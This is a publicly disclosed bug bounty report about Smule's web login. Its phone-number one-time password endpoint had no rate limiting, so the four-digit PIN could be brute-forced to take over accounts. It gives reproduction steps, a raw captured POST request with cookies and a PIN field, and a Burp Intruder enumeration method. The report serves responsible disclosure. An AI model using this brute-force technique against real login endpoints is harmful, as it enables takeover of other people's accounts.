# No Rate Limiting On Phone Number Login Leads to Login Bypass

## Report Details
- **Report ID**: 903363
- **URL**: https://hackerone.com/reports/903363
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-06-19T21:43:32.331Z
- **Disclosed**: 2020-07-24T02:19:27.893Z

## Reporter
- **Username**: done11
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: smule

## Vulnerability Information
Hey Team,

### Introduction:

A rate limiting algorithm is used to check if the user session has to be limited based on the information in the session cache. In case a client made too many requests within a given time frame.

### Description:

I was able to Bypass Authentication of any user by enumerating the **One Time Password** as there was no Rate Limiting at the Endpoint where the **One Time Password** was being checked.

### Steps To Reproduce:

1 .  Go to this [link](https://web.smule.com/s/explore#login).
2 . Create an account ,Enter the relevant pin for activation of the account.
3. Now for logging in to the account check the option of  Sign In with phone number.
4. Capture this request in Burp Suite.

```
POST /user/json/phone_login HTTP/1.1
Host: web.smule.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://web.smule.com/s/explore
Content-Type: application/x-www-form-urlencoded
X-CSRF-Token: 2ag62pPLPByBn5MIAKIJY6SJF4jhBXaO4rFkk1HquzA=
X-Smulen: 4c22718d4d9980731de84649b903429c
Content-Length: 93
Connection: close
Cookie: connection_info=eyJjb3VudHJ5IjoiUEsiLCJob21lUG9wIjoiYXNoIn0%3D--190203865a084a1be6f7ec4f9d94f59f7c9c223b; smule_id_production=eyJ3ZWJfaWQiOiI1Zjc2YjYzYi0wNmIyLTQzYWEtYjZkMC00YWFkODU3YTM3ZGEiLCJ0el9vZmZzZXQiOiIxODAwMCIsInNlc3Npb25faWQiOiJnNF8xMV9DYStEemkwZyt1TEE0L2hzc0tMMVhJd2xxczFCRTVVdndZbExJaHpJNnhER1hGZ0MxL1p6RXc9PSIsInBsYXllcl9pZCI6MjQ1NDM3NTA3NywiZGF1X3RzIjoxNTkyNTk3OTQxfQ%3D%3D--7f9ea24781b589e82ee50552e579d54bacd91c20; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJWJiNTgzNTk0Y2ZhOTBjMmU2Yzg3MWRhM2E4YzQwOTgwBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMTJhZzYycFBMUEJ5Qm41TUlBS0lKWTZTSkY0amhCWGFPNHJGa2sxSHF1ekE9BjsARg%3D%3D--ca3e6dd2aad6b33e2233ad1ac2bfc65b8437d9c8; _ga=GA1.2.1130621888.1592558335; _gid=GA1.2.1444310976.1592558335; smule_cookie_banner_disabled=true; L=N; feed_status=%7B%22last_check%22%3Anull%2C%22last_read%22%3Anull%2C%22has_activity%22%3Afalse%2C%22is_vip%22%3Afalse%2C%22is_staff%22%3Afalse%2C%22activity_count%22%3A0%2C%22has_sing%22%3Afalse%2C%22has_account_page%22%3Afalse%7D; logged_out=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; _fbp=fb.1.1592558735596.1910798227

pin_id=5159d8bd-8b96-469e-960f-4b88fc779ae0&pin_code=5062&tz_offset=18000&entered_birth_date=
```
5. Send this request to Intruder and run a iteration of the number since Rate Limit is not there, We get a 200 OK response with every request when valid **One Time Password** hit the request we can check this with length in intruder, because valid request length is different than other requests.

6. Use the **One Time Password** for login.

## Impact

An attacker could login to any user he wants as long as he knows the number of the victim. Which is basically owning all accounts.

## Attachments
- Screenshot_from_2020-06-19_14-39-22.png
